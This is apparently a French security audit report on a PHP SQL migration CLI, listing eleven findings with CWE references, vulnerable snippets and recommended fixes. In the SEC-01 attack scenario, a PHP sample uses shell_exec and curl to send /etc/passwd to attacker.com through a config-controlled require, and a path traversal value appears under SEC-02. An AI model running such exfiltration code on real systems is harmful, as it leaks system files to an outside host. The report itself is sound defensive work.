# Rapport de sécurité — fzed51/migration

**Date** : 2026-05-03  
**Outil analysé** : `fzed51/migration` — CLI de migration SQL  
**Version PHP** : 8.4.14  
**Analyseur** : Audit manuel + PHPStan level 6 + PHPUnit  
**Statut des tests** : 8/8 ✅ — `composer lint` ✅

---

## Résumé exécutif

L'analyse couvre l'intégralité des points d'entrée du projet :

| Point d'entrée | Fichier |
|---|---|
| CLI | `bin/migrate` |
| Chargement de config | `src/MigrationConfigFile.php` |
| Exécution des migrations | `src/MigrationCore.php` |
| Création de fichiers | `src/CreateMigration.php` |
| Création de répertoires | `src/CreateProviderDirectory.php` |
| Initialisation | `src/MigrationInit.php` |

**11 failles ou faiblesses** identifiées, dont **1 déjà corrigée**.

---

## Tableau de synthèse

| ID | Sévérité | Statut | Titre | Fichier |
|---|---|---|---|---|
| SEC-01 | ~~CRITIQUE~~ | ✅ CORRIGÉ | Exécution PHP arbitraire via `config_extern.file` | `MigrationConfigFile.php` |
| SEC-02 | **ÉLEVÉ** | 🔴 OUVERT | Path traversal via provider non validé | `MigrationCore.php` |
| SEC-03 | **ÉLEVÉ** | 🔴 OUVERT | Aucune vérification d'intégrité checksum à la relecture | `MigrationCore.php` |
| SEC-04 | MOYEN | 🟡 OUVERT | SHA1 cryptographiquement cassé | `MigrationCore.php` |
| SEC-05 | MOYEN | 🟡 OUVERT | Race condition TOCTOU — création de fichier | `CreateMigration.php` |
| SEC-06 | MOYEN | 🟡 OUVERT | `display_errors = On` en dur | `bin/migrate` |
| SEC-07 | FAIBLE | 🔵 OUVERT | Credentials DB dans des propriétés publiques | `MigrationConfig.php` |
| SEC-08 | FAIBLE | 🔵 OUVERT | Lecture de config sans limite de taille | `MigrationConfigFile.php` |
| SEC-09 | FAIBLE | 🔵 OUVERT | Pas de validation des types dans `initIntern()` | `MigrationConfigFile.php` |
| SEC-10 | FAIBLE | 🔵 OUVERT | Création de fichier config non atomique | `MigrationInit.php` |
| SEC-11 | FAIBLE | 🔵 OUVERT | Regex `[^a-z0-1]` — chiffres 2-9 mal filtrés | `CreateMigration.php` |

---

## Détail des failles

---

### ✅ SEC-01 — Exécution PHP arbitraire via `config_extern.file` [CORRIGÉ]

**Sévérité** : CRITIQUE  
**CWE** : CWE-98 — Improper Control of Filename for Include/Require Statement  
**Fichier** : `src/MigrationConfigFile.php` — `initExternPhp()`

#### Description

`migration-config.json` peut pointer vers un fichier PHP externe via `config_extern.file`.
Avant le correctif, ce chemin était passé directement à `require` sans aucune restriction :

```php
// AVANT — vulnérable
$config = require (string)$configExtern['file'];
```

Toute personne pouvant modifier le fichier JSON pouvait faire exécuter du code PHP arbitraire
avec les privilèges du processus (accès disque, réseau, exécution de commandes shell via `exec`).

#### Scénario d'attaque

```json
{ "config_extern": { "file": "/tmp/evil.php" } }
```

```php
// /tmp/evil.php
<?php
shell_exec('curl https://attacker.com/steal?d=' . file_get_contents('/etc/passwd'));
return [];
```

#### Correctif appliqué

Deux gardes ajoutées dans `initExternPhp()` :

1. **Extension** — rejet si le fichier n'a pas l'extension `.php`
2. **Confinement de chemin** — `realpath()` + `str_starts_with()` pour s'assurer que le fichier
   est dans le même répertoire que le `migration-config.json`

```php
// APRÈS — corrigé
if (pathinfo($file, PATHINFO_EXTENSION) !== 'php') {
    throw new RuntimeException("Le fichier externe doit avoir l'extension .php.");
}
$configDir = dirname($this->configFilename);
$resolvedFile = realpath($file);
if (!str_starts_with($resolvedFile, $configDir . DIRECTORY_SEPARATOR)) {
    throw new RuntimeException("Le fichier externe doit être dans le répertoire du projet.");
}
```

**Tests couvrant cette correction** : `test/MigrationConfigFileSecurityTest.php`

---

### 🔴 SEC-02 — Path traversal via provider non validé

**Sévérité** : ÉLEVÉ  
**CWE** : CWE-22 — Path Traversal  
**Fichier** : `src/MigrationCore.php` — `setProvider()`, `getQuerySetupFiles()`, `getQueryFiles()`

#### Description

`MigrationCore::setProvider()` accepte n'importe quelle chaîne sans validation :

```php
public function setProvider(string $provider)
{
    $this->provider = $provider;   // aucun contrôle
    return $this;
}
```

Cette valeur est ensuite insérée directement dans des chemins de fichiers :

```php
// setup files
glob(__DIR__ . '/../setup/' . $this->provider . '*.sql');

// migration files
glob($dbDir . DIRECTORY_SEPARATOR . $this->provider . DIRECTORY_SEPARATOR . '????????-??-*.sql');
```

#### Scénario d'attaque

Un appel `setProvider('../evil_dir')` pourrait inclure des fichiers SQL hors du répertoire `setup/`
ou du répertoire de migrations.

#### Mitigations existantes

- `Migration.php` valide via un `switch` les valeurs autorisées (`mysql`, `sqlite`, `postgres`)
- Le glob se termine par `*.sql`, ce qui limite les fichiers ciblés

#### Mitigation partielle mais insuffisante

`MigrationCore` est une classe publique utilisable directement sans passer par `Migration`.
La validation doit être **dans la classe qui utilise la valeur**, pas uniquement dans un appelant.

#### Correctif recommandé

Ajouter une liste blanche dans `setProvider()` :

```php
private const VALID_PROVIDERS = ['mysql', 'sqlite', 'postgres'];

public function setProvider(string $provider): static
{
    if (!in_array($provider, self::VALID_PROVIDERS, true)) {
        throw new \InvalidArgumentException("Provider '$provider' non supporté.");
    }
    $this->provider = $provider;
    return $this;
}
```

---

### 🔴 SEC-03 — Aucune vérification d'intégrité checksum à la relecture

**Sévérité** : ÉLEVÉ  
**CWE** : CWE-345 — Insufficient Verification of Data Authenticity  
**Fichier** : `src/MigrationCore.php` — `controlMigrationFilePassed()`

#### Description

Lorsqu'une migration est rejouée, le code vérifie uniquement la présence du **nom de fichier**
dans `migration_story`. Il ne compare **jamais** le checksum stocké avec le checksum actuel :

```php
private function controlMigrationFilePassed(string $filename): bool
{
    $file = basename(dirname($filename)) . DIRECTORY_SEPARATOR . basename($filename);
    $migration = array_filter($this->story, static function ($story) use ($file) {
        // compare uniquement le nom — pas le checksum
        return (self::cleanDirectorySeparator($story['FILE']) === self::cleanDirectorySeparator($file));
    });
    return !(count($migration) === 0);
}
```

Un fichier de migration peut être **modifié après son application** sans aucune détection.

#### Scénario d'attaque

1. La migration `20240101-01-create_users.sql` est appliquée et enregistrée
2. Un attaquant (accès disque) modifie ce fichier pour ajouter un `DROP TABLE users`
3. Lors du prochain run, la migration est considérée comme déjà passée → pas de détection
4. Mais si les checksums avaient été vérifiés, une alerte aurait été levée

> Note : il existe également un bug dans la clé utilisée — le champ `file` en base est en minuscule
> mais le code accède à `$story['FILE']` (majuscule), ce qui peut retourner `null` selon le driver PDO.
> Ce point mérite une vérification en conditions réelles.

#### Correctif recommandé

```php
private function controlMigrationFilePassed(string $filename): bool
{
    $file = basename(dirname($filename)) . DIRECTORY_SEPARATOR . basename($filename);
    $migration = array_filter($this->story, static function ($story) use ($file) {
        return self::cleanDirectorySeparator($story['file']) === self::cleanDirectorySeparator($file);
    });
    if (count($migration) === 0) {
        return false;
    }
    // Vérification de l'intégrité
    $stored = array_values($migration)[0];
    $currentChecksum = sha1_file($filename);  // à remplacer par sha256 (SEC-04)
    if ($stored['checksum'] !== $currentChecksum) {
        throw new \RuntimeException(
            "Intégrité compromise : le fichier '$file' a été modifié après son application."
        );
    }
    return true;
}
```

---

### 🟡 SEC-04 — SHA1 cryptographiquement cassé

**Sévérité** : MOYEN  
**CWE** : CWE-327 — Use of a Broken or Risky Cryptographic Algorithm  
**Fichier** : `src/MigrationCore.php:225` — `storeMigration()`

#### Description

```php
$checksum = sha1_file($filename);
```

SHA1 est **cryptographiquement compromis** depuis 2017 (attaque SHAttered — première collision SHA1
en pratique). Un attaquant disposant des ressources nécessaires pourrait forger un fichier SQL
alternatif ayant exactement le même SHA1, contournant la contrainte `UNIQUE` sur `checksum`
dans `migration_story`.

#### Correctif recommandé

```php
$checksum = hash_file('sha256', $filename);
```

> À coordonner avec SEC-03 : si la vérification de checksum est ajoutée, utiliser SHA256 dès le départ.

---

### 🟡 SEC-05 — Race condition TOCTOU — création de fichier

**Sévérité** : MOYEN  
**CWE** : CWE-367 — Time-of-Check Time-of-Use (TOCTOU)  
**Fichier** : `src/CreateMigration.php:92-100` — `createFile()`

#### Description

```php
do {
    $index++;
    $pattern = $path . DIRECTORY_SEPARATOR . $date . '-' . substr('00' . $index, -2) . '-*.sql';
    $notFound = (0 === count(glob($pattern)));   // CHECK
} while (!$notFound);
$filename = $date . '-' . substr('00' . $index, -2) . '-' . $this->new_migration . '.sql';
touch($path . DIRECTORY_SEPARATOR . $filename);  // USE — fenêtre de course ici
```

Entre la vérification `glob()` et le `touch()`, un autre processus concurrent peut créer
le même fichier. Résultat : fichier de migration écrasé silencieusement (contenu vide).

#### Correctif recommandé

Utiliser `fopen()` avec le flag `x` (création exclusive, échec si le fichier existe) :

```php
$handle = @fopen($path . DIRECTORY_SEPARATOR . $filename, 'x');
if ($handle === false) {
    // concurrence détectée, retenter avec l'index suivant
}
fclose($handle);
```

---

### 🟡 SEC-06 — `display_errors = On` en dur

**Sévérité** : MOYEN  
**CWE** : CWE-209 — Information Exposure Through an Error Message  
**Fichier** : `bin/migrate:12`

#### Description

```php
ini_set('display_errors', 'On');
```

Cette directive est forcée sans condition d'environnement. En cas d'erreur fatale non interceptée,
PHP peut afficher : chemins absolus du serveur, structure de la base de données, stack traces
contenant des credentials partiels. Ces informations peuvent se retrouver dans des logs centralisés
(Datadog, Splunk, ELK) ou être capturées par des pipelines CI/CD.

#### Correctif recommandé

```php
// Activer uniquement en développement
if (getenv('APP_ENV') === 'development') {
    ini_set('display_errors', 'On');
    error_reporting(E_ALL);
} else {
    ini_set('display_errors', 'Off');
    ini_set('log_errors', 'On');
}
```

---

### 🔵 SEC-07 — Credentials DB dans des propriétés publiques

**Sévérité** : FAIBLE  
**CWE** : CWE-312 — Cleartext Storage of Sensitive Information  
**Fichier** : `src/MigrationConfig.php:21-51`

#### Description

```php
class MigrationConfig
{
    public $user;
    public $pass;    // accessible depuis n'importe quel contexte
    // ...
}
```

Les credentials de base de données sont exposés comme propriétés publiques sans encapsulation.
Risques : sérialisation accidentelle (`var_export`, `json_encode`), log de debug, dump de variables.

#### Correctif recommandé

PHP 8.1 — utiliser `readonly` pour une immutabilité avec accès contrôlé :

```php
class MigrationConfig
{
    public function __construct(
        public readonly string $migration_directory,
        public readonly string $provider,
        public readonly string $host,
        public readonly int    $port,
        public readonly string $name,
        public readonly string $user,
        public readonly string $pass,
    ) { /* ... */ }
}
```

> Alternativement : passer les propriétés en `private` et n'exposer `pass` via aucun accesseur.

---

### 🔵 SEC-08 — Lecture de fichier config sans limite de taille

**Sévérité** : FAIBLE  
**CWE** : CWE-400 — Uncontrolled Resource Consumption  
**Fichier** : `src/MigrationConfigFile.php:42`

#### Description

```php
$this->config = json_decode(file_get_contents($config_filename), true);
```

`file_get_contents` charge l'intégralité du fichier en mémoire sans aucune limite de taille.
Un fichier de config anormalement volumineux peut provoquer un épuisement mémoire.

#### Correctif recommandé

```php
$maxSize = 1024 * 1024; // 1 Mo — amplement suffisant pour un fichier de config
if (filesize($config_filename) > $maxSize) {
    throw new RuntimeException("Le fichier de configuration est trop volumineux (> 1 Mo).");
}
$this->config = json_decode(file_get_contents($config_filename), true);
```

---

### 🔵 SEC-09 — Pas de validation des types dans `initIntern()`

**Sévérité** : FAIBLE  
**CWE** : CWE-20 — Improper Input Validation  
**Fichier** : `src/MigrationConfigFile.php:138-145` — `initIntern()`

#### Description

```php
private function initIntern(): void
{
    $configIntern = $this->config['config_intern'];
    $this->provider = $configIntern['provider'] ?? '';  // pourrait être un array
    $this->port     = $configIntern['port']     ?? 0;   // pourrait être une string
    // ...
}
```

Les valeurs JSON ne sont pas validées en type avant affectation. Un `port` fourni comme `"abc"`
n'est pas rejeté. En PHP non strict, cela passe silencieusement et peut causer des comportements
inattendus dans `PDOFactory`.

#### Correctif recommandé

Valider les types au chargement :

```php
if (!is_string($configIntern['provider'] ?? null)) {
    throw new RuntimeException("'provider' doit être une chaîne.");
}
if (!is_int($configIntern['port'] ?? null)) {
    throw new RuntimeException("'port' doit être un entier.");
}
```

---

### 🔵 SEC-10 — Création du fichier config non atomique

**Sévérité** : FAIBLE  
**CWE** : CWE-362 — Concurrent Execution Using Shared Resource  
**Fichier** : `src/MigrationInit.php:35-58` — `run()`

#### Description

```php
if (!is_file($this->config_file)) {
    touch($this->config_file);                                    // étape 1
    // ...
    file_put_contents($this->config_file, json_encode($structure)); // étape 2
}
```

Si `file_put_contents()` échoue après `touch()` (permissions, disque plein), le fichier existe
mais est **vide**. Lors d'un appel suivant, la condition `!is_file()` sera fausse et une exception
sera levée — rendant impossible la réinitialisation sans intervention manuelle.

#### Correctif recommandé

Écrire dans un fichier temporaire puis renommer (`rename()` est atomique sur le même filesystem) :

```php
$tmp = $this->config_file . '.tmp';
file_put_contents($tmp, json_encode($structure, JSON_PRETTY_PRINT));
rename($tmp, $this->config_file);
```

---

### 🔵 SEC-11 — Regex `[^a-z0-1]` — chiffres 2-9 ignorés dans les noms de migration

**Sévérité** : FAIBLE  
**CWE** : CWE-20 — Improper Input Validation  
**Fichier** : `src/CreateMigration.php:131` — `cleanName()`

#### Description

```php
$str = preg_replace('/(\s+)|([^a-z0-1]+)/', '_', $str);
//                              ^^^^^ devrait être 0-9
```

La plage `0-1` couvre uniquement les chiffres `0` et `1`. Les chiffres `2` à `9` sont remplacés
par `_`. Ainsi, un nom `add_index_2024` devient `add_index____`. Ce n'est pas une faille de
sécurité directe, mais un nom de fichier incorrect peut induire en erreur sur la chronologie
des migrations.

#### Correctif recommandé

```php
$str = preg_replace('/(\s+)|([^a-z0-9]+)/', '_', $str);
//                              ^^^^^ 0-9
```

---

## Plan de remédiation recommandé

### Sprint 1 — Sécurité critique (déjà traitée)
- [x] SEC-01 — Exécution PHP arbitraire ✅

### Sprint 2 — Intégrité & traversal
- [ ] SEC-02 — Whitelist provider dans `MigrationCore::setProvider()`
- [ ] SEC-03 — Vérification checksum à la relecture + correction de la clé `FILE`/`file`
- [ ] SEC-04 — Remplacer SHA1 par SHA256

### Sprint 3 — Robustesse
- [ ] SEC-05 — Race condition TOCTOU avec `fopen(..., 'x')`
- [ ] SEC-06 — `display_errors` conditionnel à `APP_ENV`
- [ ] SEC-10 — Écriture atomique dans `MigrationInit`

### Sprint 4 — Durcissement
- [ ] SEC-07 — Propriétés `readonly` dans `MigrationConfig`
- [ ] SEC-08 — Limite de taille sur la lecture du JSON
- [ ] SEC-09 — Validation des types dans `initIntern()`
- [ ] SEC-11 — Correction regex `[^a-z0-9]`

---

*Rapport généré le 2026-05-03 — à réévaluer après chaque sprint de remédiation.*
